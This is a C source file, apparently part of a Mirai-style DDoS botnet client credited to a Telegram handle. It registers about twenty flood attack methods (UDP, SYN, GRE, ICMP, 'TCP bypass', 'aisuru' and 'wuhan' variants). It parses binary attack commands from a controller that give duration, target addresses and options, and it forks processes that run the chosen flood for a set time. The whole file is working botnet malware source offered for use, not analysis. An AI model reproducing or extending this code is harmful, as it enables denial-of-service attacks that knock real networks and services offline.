#define _GNU_SOURCE

// by juan @ipmiv2 on telegram

#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include "headers/config.h"
#include "headers/attack.h"
#include "headers/rand.h"
#include "headers/util.h"

uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

int pid1, pid2;

BOOL attack_init(void)
{
    add_attack(ATK_VEC_NUDP, (ATTACK_FUNC)attack_udp_nudp);
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_udp_std);
    add_attack(ATK_VEC_MIXAMP, (ATTACK_FUNC)attack_udp_mixamp);
    add_attack(ATK_VEC_DISCORD, (ATTACK_FUNC)attack_udp_discord);
    add_attack(ATK_VEC_UDPRAND, (ATTACK_FUNC)attack_udp_rand);
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
    add_attack(ATK_VEC_TCP_BYPASS, (ATTACK_FUNC)attack_tcp_bypass);
    add_attack(ATK_VEC_LEGIT, (ATTACK_FUNC)attack_tcp_legit);
    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_tcp_socket);
    add_attack(ATK_VEC_TCPBOOM, (ATTACK_FUNC)attack_tcp_boom);
    add_attack(ATK_VEC_TCPKILLER, (ATTACK_FUNC)attack_tcp_killer);
    add_attack(ATK_VEC_TCPXMAS, (ATTACK_FUNC)attack_tcp_xmas);
    add_attack(ATK_VEC_TCPFRAG, (ATTACK_FUNC)attack_tcp_frag);
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_gre_ip);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_gre_eth);
    add_attack(ATK_VEC_ICMPECHO_AISURU, (ATTACK_FUNC)attack_icmp_echo_aisuru);
    add_attack(ATK_VEC_GREIP_AISURU, (ATTACK_FUNC)attack_gre_ip_aisuru);
    add_attack(ATK_VEC_SOCKET_AISURU, (ATTACK_FUNC)attack_tcp_socket_aisuru);
    add_attack(ATK_VEC_SYN_AIRUSU, (ATTACK_FUNC)attack_tcp_syn_aisuru);
    add_attack(ATK_VEC_UDPBYPASS_WUHAN, (ATTACK_FUNC)udpbypass_flood_wuhan);

    return TRUE;
}

void attack_kill_all(void)
{
    for (int i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0)
        {
            kill(attack_ongoing[i], SIGKILL);
            attack_ongoing[i] = 0;
        }
    }
}


void attack_parse(char *buf, int len)
{
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;

    if (len < sizeof(uint32_t))
        goto cleanup;

    uint32_t dur;
    util_memcpy(&dur, buf, sizeof(dur));
    duration = ntohl(dur);
    buf += sizeof(uint32_t);
    len -= sizeof(uint32_t);

    if (len == 0)
        goto cleanup;

    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof(uint8_t);

    if (len == 0)
        goto cleanup;

    targs_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if (targs_len == 0 || len < ((sizeof(ipv4_t) + sizeof(uint8_t)) * targs_len))
        goto cleanup;

    targs = calloc(targs_len, sizeof(struct attack_target));
    if (targs == NULL)
        goto cleanup;

    for (int i = 0; i < targs_len; i++)
    {
        ipv4_t addr;
        util_memcpy(&addr, buf, sizeof(addr));
        targs[i].addr = addr;
        buf += sizeof(ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof(ipv4_t) + sizeof(uint8_t));
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }

    if (len < sizeof(uint8_t))
        goto cleanup;

    opts_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);

    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof(struct attack_option));
        if (opts == NULL)
            goto cleanup;

        for (int i = 0; i < opts_len; i++)
        {
            uint8_t val_len;
            if (len < sizeof(uint8_t))
                goto cleanup;

            opts[i].key = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if (len < sizeof(uint8_t))
                goto cleanup;

            val_len = (uint8_t)*buf++;
            len -= sizeof(uint8_t);

            if (len < val_len)
                goto cleanup;

            opts[i].val = calloc(val_len + 1, sizeof(char));
            if (opts[i].val == NULL)
                goto cleanup;

            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }

    errno = 0;
    attack_start(duration, vector, targs_len, targs, opts_len, opts);

cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}

void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    pid1 = fork();
    if (pid1 == -1 || pid1 > 0)
        return;

    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    else if (pid2 == 0)
    {
        sleep(duration);
        kill(getppid(), SIGKILL);
        exit(0);
    }
    else
    {
        for (int i = 0; i < methods_len; i++)
        {
            if (methods[i]->vector == vector)
            {
                methods[i]->func(targs_len, targs, opts_len, opts);
                break;
            }
        }
        exit(0);
    }
}

char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    for (int i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }
    return def;
}

int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}

uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}

static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof(struct attack_method));
    if (method == NULL)
        return;
    method->vector = vector;
    method->func = func;
    struct attack_method **new_methods = realloc(methods, (methods_len + 1) * sizeof(struct attack_method *));
    if (new_methods == NULL)
    {
        free(method);
        return;
    }
    methods = new_methods;
    methods[methods_len++] = method;
}

static void free_opts(struct attack_option *opts, int len)
{
    if (opts == NULL)
        return;
    for (int i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
